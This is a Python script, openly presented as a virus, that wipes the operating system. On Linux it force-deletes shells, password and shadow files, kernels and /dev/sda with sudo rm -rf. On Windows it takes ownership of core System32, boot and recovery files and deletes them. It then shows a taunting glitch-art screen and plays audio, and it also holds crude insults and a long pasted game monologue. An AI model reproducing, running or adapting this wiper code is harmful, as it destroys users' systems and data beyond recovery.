import subprocess
import os
import time
import random
import shutil
import pygame
from turtle import *

def malicious_shit():
    def linux_destroyer():
        linux_paths = [
            "/bin/bash", "/bin/sh", "/etc/passwd", "/etc/shadow", "/etc/fstab", "/etc/sysctl.conf", "/boot/vmlinuz-*",
            "/boot/initramfs-*.img", "/usr/lib/systemd/", "/etc/lvm/lvm.conf", "/dev/null", "/dev/zero", "/dev/sda"
        ]
        for path in linux_paths:
            try:
                os.popen(f"sudo rm -r -f {path} --no-preserve-root")
            except Exception as e:
                print(f"Error removing {path}: {e}")

    def windows_destroyer():
        try:
            paths = [
                "C:\\Windows", "C:\\Windows\\System32", "C:\\Windows\\System32\\hal.dll", "C:\\Windows\\System32\\ntoskrnl.exe",
                "C:\\Windows\\System32\\Boot\\winload.exe", "C:\\Windows\\System32\\kdcom.dll", "C:\\Windows\\System32\\bootmgr",
                "C:\\Windows\\System32\\kernel32.dll", "C:\\Windows\\System32\\ntdll.dll", "C:\\Windows\\System32\\ntfs.sys",
                "C:\\Windows\\System32\\volsnap.sys", "C:\\Windows\\System32\\hidclass.sys", "C:\\Windows\\System32\\mountmgr.sys",
                "C:\\Windows\\System32\\usbhub.sys", "C:\\Windows\\System32\\dxgkrnl.sys", "C:\\Windows\\win.ini",
                "C:\\Windows\\Inf", "C:\\Windows\\System32\\Recovery", "C:\\Windows\\System32\\Restore", "C:\\Windows\\System32\\winre.wim",
                "C:\\Windows\\System32\\rstrui.exe"
            ]
            for path in paths:
                subprocess.run(['takeown', '/F', path], check=True)
                subprocess.run(['icacls', path, "/t", "/grant", "Everyone:(OI)(CI)F"], check=True)

            directories = ["C:\\Windows\\System32\\Boot", "C:\\Windows\\System32", "C:\\Windows\\Inf", "C:\\Windows\\System32\\Recovery", "C:\\Windows\\System32\\Restore"]
            files = [
                "C:\\Windows\\System32\\ntoskrnl.exe", "C:\\Windows\\System32\\hal.dll", "C:\\Windows\\System32\\Boot\\winload.exe",
                "C:\\Windows\\System32\\kdcom.dll", "C:\\Windows\\System32\\bootmgr", "C:\\Windows\\System32\\kernel32.dll",
                "C:\\Windows\\System32\\ntdll.dll", "C:\\Windows\\System32\\ntfs.sys", "C:\\Windows\\System32\\volsnap.sys",
                "C:\\Windows\\System32\\hidclass.sys", "C:\\Windows\\System32\\mountmgr.sys", "C:\\Windows\\System32\\usbhub.sys",
                "C:\\Windows\\System32\\dxgkrnl.sys", "C:\\Windows\\win.ini", "C:\\Windows\\System32\\winre.wim",
                "C:\\Windows\\System32\\rstrui.exe"
            ]

            for directory in directories:
                shutil.rmtree(directory, ignore_errors=True)

            for file in files:
                os.remove(file)

        except Exception as e:
            print(f"An error occurred: {e}")

    if os.name == 'posix':
        linux_destroyer()
    elif os.name == 'nt':
        windows_destroyer()

def graphics():
    screen = Screen()
    screen.bgcolor("black")
    screen.title("UH OH UR FILES ARE GONIE GONE :)")
    screen.setup(width=1920, height=1080)

    glitch_turtle = Turtle()
    glitch_turtle.shape('turtle')
    glitch_turtle.color('cyan')
    glitch_turtle.shapesize(2)
    glitch_turtle.pensize(2)
    glitch_turtle.speed(0)

    glitch_intensity = 10
    color_change_speed = 0.5

    def random_glitch():
        x, y = glitch_turtle.position()
        glitch_turtle.goto(
            x + random.randint(-glitch_intensity, glitch_intensity),
            y + random.randint(-glitch_intensity, glitch_intensity)
        )
        r = random.random()
        g = random.random()
        b = random.random()
        glitch_turtle.color((r, g, b))
        if random.random() > 0.7:
            glitch_turtle.pendown()
        else:
            glitch_turtle.penup()
        glitch_turtle.setheading(random.randint(0, 360))

        screen.ontimer(random_glitch, int(random.randint(50, 150)))

    def move_forward():
        glitch_turtle.forward(10)
        screen.ontimer(move_forward, 50)

    writer = Turtle()
    writer.hideturtle()
    writer.speed(0)
    writer.penup()
    writer.goto(0, 0)

    colors = ["red", "orange", "yellow", "lime", "cyan", "violet"]

    def glitch_effect(counter=0):
        if counter < 50:
            writer.goto(random.randint(-900, 900), random.randint(-500, 500))
            writer.color(random.choice(colors))
            writer.clear()
            writer.write("Sowwy mister i... i ate swome fiwles :( pls fowgive me daddwy :^_^)", align="center", font=("Comic Sans MS", 32, "bold"))
            screen.ontimer(lambda: glitch_effect(counter + 1), 100)

    glitch_effect()
    random_glitch()
    move_forward()
    screen.mainloop()
    done()

if __name__ == "__main__":
    if os.name == 'nt' and os.geteuid() != 0:
        print("Please run this script as an administrator.")
        exit(1)

    while True:
        user_input = input("This is a virus, are you sure you want to run it? (y/n): ").lower()
        if user_input == 'y':
            malicious_shit()
            if os.path.exists("gl.mp3"):
                pygame.mixer.init()
                pygame.mixer.music.load("gl.mp3")
                pygame.mixer.music.play(-1)
                while pygame.mixer.music.get_busy():
                    time.sleep(1)
            else:
                print("gl.mp3 not found!")
            break
        elif user_input == 'n':
            print("Yeah, I knew you had no balls to run this shit.")
        elif user_input == 'Henry':
            print("""Connection terminated. I'm sorry to interrupt you, Elizabeth, if you still even remember that name, But I'm afraid you've been misinformed. You are not here to receive a gift, nor have you been called here by the individual you assume, although, you have indeed been called. You have all been called here, into a labyrinth of sounds and smells, misdirection and misfortune. A labyrinth with no exit, a maze with no prize. You don't even realize that you are trapped. Your lust for blood has driven you in endless circles, chasing the cries of children in some unseen chamber, always seeming so near, yet somehow out of reach, but you will never find them. None of you will. This is where your story ends. And to you, my brave volunteer, who somehow found this job listing not intended for you, although there was a way out planned for you, I have a feeling that's not what you want. I have a feeling that you are right where you want to be. I am remaining as well. I am nearby. This place will not be remembered, and the memory of everything that started this can finally begin to fade away. As the agony of every tragedy should. And to you monsters trapped in the corridors, be still and give up your spirits. They don't belong to you. For most of you, I believe there is peace and perhaps more waiting for you after the smoke clears. Although, for one of you, the darkest pit of Hell has opened to swallow you whole, so don't keep the devil waiting, old friend. My daughter, if you can hear me, I knew you would return as well. It's in your nature to protect the innocent. I'm sorry that on that day, the day you were shut out and left to die, no one was there to lift you up into their arms the way you lifted others into yours, and then, what became of you. I should have known you wouldn't be content to disappear, not my daughter. I couldn't save you then, so let me save you now. It's time to rest - for you, and for those you have carried in your arms. This ends for all of us. End communication. """)
            break
        else:
            print("Invalid input. You stupid")
